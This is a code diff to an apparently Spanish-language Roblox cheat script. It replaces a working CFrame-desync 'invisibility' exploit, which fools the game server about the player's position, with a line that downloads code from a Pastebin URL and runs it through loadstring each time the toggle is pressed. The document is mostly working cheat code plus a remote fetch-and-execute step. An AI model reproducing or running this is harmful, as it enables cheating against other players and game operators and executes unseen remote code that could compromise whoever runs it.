@@ -1444,68 +1444,13 @@ local function _toggleGrav()
 end
 _grb.MouseButton1Click:Connect(_toggleGrav)
 
--- INVISIBILIDAD (FE CFrame Desync)
-local _invisCF = nil
-
+-- INVISIBILIDAD (motor externo FE)
 local function _toggleInvis()
 	_invis = not _invis
-	if _invis then
-		local hrp = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
-		if not hrp then _invis = false; return end
-		if _spL then _spL.TextColor3 = C3_ON end
-		-- guardar posicion real
-		_invisCF = hrp.CFrame
-		-- mandar al servidor lejoooos
-		hrp.CFrame = CFrame.new(9e8, 9e8, 9e8)
-		hrp.Velocity = V3_ZERO
-		-- esperar que el servidor registre
-		task.wait(0.5)
-		-- volver localmente a donde estabas
-		hrp.CFrame = _invisCF
-		-- verte fantasma pa saber que estas invisible
-		pcall(function()
-			for _, p in ipairs(LP.Character:GetDescendants()) do
-				if p:IsA("BasePart") then p.LocalTransparencyModifier = 0.6 end
-			end
-		end)
-		-- mantener posicion local + efecto fantasma
-		_invisCon = RS.Stepped:Connect(function()
-			if not _invis then return end
-			local ch = LP.Character
-			if not ch then return end
-			local hrp2 = ch:FindFirstChild("HumanoidRootPart")
-			if not hrp2 then return end
-			-- si el servidor intenta mandarnos de vuelta al 9e8, cancelar
-			if hrp2.Position.Magnitude > 1e7 then
-				hrp2.CFrame = _invisCF
-			end
-			-- actualizar posicion guardada pa cuando desactivemos
-			if hrp2.Position.Magnitude < 1e7 then
-				_invisCF = hrp2.CFrame
-			end
-			-- mantener efecto fantasma
-			for _, p in ipairs(ch:GetDescendants()) do
-				if p:IsA("BasePart") then p.LocalTransparencyModifier = 0.6 end
-			end
-		end)
-	else
-		if _spL then _spL.TextColor3 = C3_OFF end
-		if _invisCon then _invisCon:Disconnect(); _invisCon = nil end
-		-- quitar efecto fantasma
-		pcall(function()
-			for _, p in ipairs(LP.Character:GetDescendants()) do
-				if p:IsA("BasePart") then p.LocalTransparencyModifier = 0 end
-			end
-		end)
-		-- forzar al servidor a ver nuestra posicion real
-		pcall(function()
-			local hrp = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
-			if hrp and _invisCF then
-				hrp.CFrame = _invisCF
-			end
-		end)
-		_invisCF = nil
-	end
+	if _spL then _spL.TextColor3 = _invis and C3_ON or C3_OFF end
+	pcall(function()
+		loadstring(game:HttpGet("https://pastebin.com/raw/3Rnd9rHf"))()
+	end)
 end
 
 local _tinfo = TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
